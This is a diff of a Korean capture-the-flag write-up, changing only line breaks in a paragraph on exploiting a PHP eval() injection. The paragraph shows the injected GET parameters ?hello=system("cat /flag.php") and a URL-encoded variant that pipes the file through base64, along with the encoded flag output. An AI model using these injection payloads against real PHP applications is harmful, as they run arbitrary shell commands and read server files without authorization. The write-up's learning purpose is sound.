@@ -27,8 +27,8 @@ eval("var_dump($a);");
 ```
 
 
-
-처음에는 hello파라미터에 ?hello=system("cat /flag.php");를 전송했는데, string(2) "?>" 라고 출력되고 flag가 나오지 않았습니다.그래서 고민을 하다가 두번째 시도에서 ?hello=system(%22cat%20flag.php|base64%22)라고 전송을 하였더니 base64로 암호화된 PD9waHAgCiRmbGFnID0iTm9wZSI7CgovLyBzdW57YzBtbTRuRF8xTmozY3RpMG5faTVfRTRzWX07가 출력되어서 복호화를 하니 문제가 해결되었습니다.
+처음에는 hello파라미터에 ?hello=system("cat /flag.php");를 전송했는데, string(2) "?>" 라고 출력되고 flag가 나오지 않았습니다.
+그래서 고민을 하다가 두번째 시도에서 ?hello=system(%22cat%20flag.php|base64%22)라고 전송을 하였더니 base64로 암호화된 PD9waHAgCiRmbGFnID0iTm9wZSI7CgovLyBzdW57YzBtbTRuRF8xTmozY3RpMG5faTVfRTRzWX07가 출력되어서 복호화를 하니 문제가 해결되었습니다.
 
 ```php
 <?php 
